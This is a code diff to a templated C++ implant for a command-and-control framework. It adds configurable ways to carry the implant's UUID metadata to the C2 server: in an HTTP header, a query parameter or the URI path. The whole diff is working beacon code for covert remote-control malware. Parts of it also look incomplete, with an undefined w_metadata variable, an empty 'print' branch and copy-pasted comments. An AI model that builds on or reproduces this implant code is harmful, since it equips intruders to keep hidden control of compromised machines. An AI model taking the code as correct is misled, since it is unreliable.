@@ -34,15 +34,13 @@ nlohmann::json get(std::string implant_uuid) {
     // Note: pass a copy of implant_uuid in, as we are going to be potentially heavily editing it. 
     std::string http_response_buffer;
 
-    // Create metadata map
+    // Prep metadata as plaintext/unobsfucated
     std::map<std::string, std::string> metadata_map;
     metadata_map["implant_uuid"] = implant_uuid;
-
-    //this is fine as uint8_T vector for now
     std::vector<uint8_t> metadata_as_msgpack;
     create_metadata(metadata_map, metadata_as_msgpack);
 
-    // Hold bytes in string, as all the transforms want a string
+    // Hold bytes in a string container, as all the transforms want a string
     // do NOT change the `metadata` var name prior to templating, it's needed for it
     std::string metadata(metadata_as_msgpack.begin(), metadata_as_msgpack.end());
     std::vector<std::wstring> headers;
@@ -54,10 +52,48 @@ nlohmann::json get(std::string implant_uuid) {
     [%- endfor %]
     // --- End Transforms ---
 
-    [# IF MC2 says it wants a header for where to find the metadata... #]
+    // --- Malleable C2 Metadata transport method ---
+    //note - using scopes for each option
+    // Start with the base URI from the profile
+    std::wstring uri = L"[[ http_get_uri ]]";
+
+    [# HTTP_GET: METADATA: HEADER - IF MC2 says it wants a header for where to find the metadata... #]
     [%- if http_get_client_metadata_terminator == "header" %]
-    headers.push_back(L"[[ http_get_client_metadata_terminator_value ]]: " + std::wstring(metadata.begin(), metadata.end()));
+    {
+        std::wstring key = L"[[ http_get_client_metadata_terminator_value ]]";
+        headers.push_back(key + L": " + w_metadata);
+    }
     [%- endif %]
+
+    [# HTTP_GET: METADATA: PARAMETER - IF MC2 says it wants a header for where to find the metadata... #]
+    [#(e.g., /search?q=BASE64...)#]
+    [%- if http_get_client_metadata_terminator == "parameter" %]
+    {
+        std::wstring key = L"[[ http_get_client_metadata_terminator_value ]]";
+        //append ?=metadata
+        uri += L"?" + key + L"=" + w_metadata;
+    }
+    [%- endif %]
+
+    [# HTTP_GET: METADATA: URI - IF MC2 says it wants a header for where to find the metadata... #]
+    [%- if http_get_client_metadata_terminator == "uri" %]
+    {
+        //TODO: check if `/` at last char, if not, add one.
+        if (!uri.empty() && uri.back() != '/') {
+            uri.push_back('/');
+        }
+        uri += w_metadata;
+    }
+    [%- endif %]
+
+
+
+    [# HTTP_GET: METADATA: PRINT - IF MC2 says it wants a header for where to find the metadata... #]
+    [%- if http_get_client_metadata_terminator == "print" %]
+
+    [%- endif %]
+
+    // --- End Malleable C2 Metadata transport method ---
 
     if (HTTP_GET(headers, http_response_buffer)) {
         // Check if buffer is empty before decoding
